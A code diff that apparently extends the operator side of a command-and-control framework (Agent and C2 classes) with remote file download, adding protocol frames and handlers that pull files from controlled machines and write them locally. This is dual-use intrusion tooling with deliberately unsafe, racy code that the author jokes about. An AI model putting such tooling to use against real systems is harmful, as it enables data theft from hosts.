@@ -3,7 +3,9 @@ import socket
 from dataclasses import dataclass
 from threading import Thread
 from time import sleep
+from typing import BinaryIO
 from uuid import uuid4
+from pathlib import Path
 
 from agent.protocol import (
     ProtocolSession,
@@ -13,6 +15,11 @@ from agent.protocol import (
     ProcessStartedFrame,
     ProcessTerminatedFrame,
     ProcessPipeFrame,
+    FileDownloadRequestFrame,
+    FileTransferStartFrame,
+    FileTransferDataFrame,
+    FileTransferCompleteFrame,
+    FileTransferFailFrame,
 )
 
 
@@ -37,6 +44,7 @@ class Agent:
     os: str
     process_counter: int
     processes: dict[int, Process]
+    files_downloads: dict[int, Path | BinaryIO]
 
     def __init__(self, uuid: uuid4, session: ProtocolSession):
         self.session = session
@@ -44,6 +52,8 @@ class Agent:
         self.os = "Unknown"
         self.processes = {}
         self.process_counter = 0
+        self.files_downloads = {}
+        self.files_counter = 0
 
     @property
     def address(self) -> str:
@@ -55,6 +65,7 @@ class Agent:
     def spawn_process(self, command: str):
         counter = self.process_counter
         self.process_counter += 1
+        self.files_counter += 1  # Smyler's note: race condition goes brrrrr
         self.session.send(ProcessStartRequestFrame(command, counter))
         while True:
             process = filter(lambda p: p.task_id == counter, self.processes.values())
@@ -62,6 +73,14 @@ class Agent:
             if len(process) > 0:
                 return process[0]
             sleep(0.01)
+
+    def download_file(self, remote_path: str, local_path: Path):
+        counter = self.files_counter
+        self.files_counter += 1  # Smyler's note: race condition goes brrrrr
+        self.files_downloads[counter] = local_path
+        self.session.send(FileDownloadRequestFrame(counter, remote_path, 1024))
+        while counter in self.files_downloads:
+            sleep(0.1)
 
 
 class C2:
@@ -139,5 +158,35 @@ def SessionAgent(uuid: uuid4, session: ProtocolSession) -> Agent:
     def handle(frame: ProcessPipeFrame, _):
         process = agent.processes[frame.pid]
         process.output.extend(frame.data)
+
+    @session.handler(FileTransferFailFrame)
+    def handle(frame: FileTransferFailFrame, _):
+        handle = agent.files_downloads.pop(frame.request_id, None)
+        try:
+            handle.close()
+        except:
+            pass
+
+    @session.handler(FileTransferStartFrame)
+    def handle(frame: FileTransferStartFrame, _):
+        fname = agent.files_downloads.get(frame.request_id)
+        # Who as time to write thread-safe code ???
+        if not isinstance(fname, Path):
+            return
+        agent.files_downloads[frame.request_id] = open(fname, 'wb')
+
+    @session.handler(FileTransferDataFrame)
+    def handle(frame: FileTransferDataFrame, _):
+        try:
+            agent.files_downloads[frame.request_id].write(frame.data)
+        except:
+            pass
+
+    @session.handler(FileTransferCompleteFrame)
+    def handle(frame: FileTransferCompleteFrame, _):
+        try:
+            agent.files_downloads.pop(frame.request_id).close()
+        except:
+            pass
 
     return agent
